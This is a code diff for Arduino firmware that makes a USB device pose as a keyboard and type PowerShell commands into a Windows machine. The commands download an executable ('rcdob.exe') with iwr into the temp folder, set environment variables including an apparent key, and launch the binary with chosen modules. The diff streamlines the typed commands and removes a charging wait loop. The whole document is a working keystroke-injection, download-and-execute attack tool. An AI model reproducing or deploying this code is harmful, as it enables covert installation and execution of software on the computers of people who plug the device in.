@@ -1,8 +1,8 @@
 #include "Keyboard.h"
 
-char notifyConfig[] = "set RCDO_NOTIFY=0";
-char apiKey[] = "set RCDO_KEY=whyare";
-char dlCmd[] = "iwr -Uri http://localhost/test -OutFile rcdob.exe"; 
+char notifyConfig[] = "$Env:RCDO_NOTIFY=0; `\n";
+char apiKey[] = "$Env:RCDO_KEY=\"whyare\"; `\n";
+char dlCmd[] = "iwr -Uri http://localhost:5000/download/bin/watch-binary -OutFile $Env:temp\\rcdob.exe; `\n"; 
 
 float getVCC() {
   SYSCTRL->VREF.reg |= SYSCTRL_VREF_BGOUTEN;
@@ -78,23 +78,14 @@ void runPS(){
 }
 
 void downloadBin(){
-  Keyboard.print("cd $env:TEMP");
-  Keyboard.write(KEY_RETURN);
-  delay(30);
+  Keyboard.print("cd $env:TEMP; `\n");
   Keyboard.print(dlCmd);
-  Keyboard.write(KEY_RETURN);
-  delay(5000);
 }
 
 void setupConfig(int notify){
   Keyboard.print(apiKey);
-  Keyboard.write(KEY_RETURN);
-  delay(30);
-
   if (!notify){
     Keyboard.print(notifyConfig);
-    Keyboard.write(KEY_RETURN);
-    delay(30);    
   }
 }
 
@@ -104,21 +95,6 @@ void startBinary(int *option){
   }
   pinMode(LED_BUILTIN, OUTPUT);
 
-  // blocking loop until plugged in
-  while(1){
-    float battVoltageReading = getBattVoltage();
-    if (battVoltageReading < 4.25)
-    {
-      digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
-      delay(500);                       // wait for a second
-      digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
-      delay(500);  
-    }
-    else{
-      break; 
-    }
-  }
-
   // wait 1 sec to allow for higher success rates
   // due to some funky windows USB recognition
   delay(1000);
@@ -126,23 +102,13 @@ void startBinary(int *option){
   runPS();
   downloadBin();
   setupConfig(option[3]);
-  char buf[560];
   //strcpy(buf,binaryCmdline);
   char *mods = selectModules(option);
 
-  //strcat(buf,mods);
+  Keyboard.print(".\\rcdob.exe ");
+  Keyboard.print(mods);
+  Keyboard.print("; `\nexit\n");
 
-  sprintf(buf, "function spawn{start rcdob.exe%s;exit;}", mods);
-  
-  Keyboard.print(buf);
-  Keyboard.write(KEY_RETURN);
-
-  delay(500);
-  Keyboard.print("exit");
-  Keyboard.write(KEY_RETURN);
-
-  delay(30);
-  
   free(mods);
   Keyboard.end();
 }
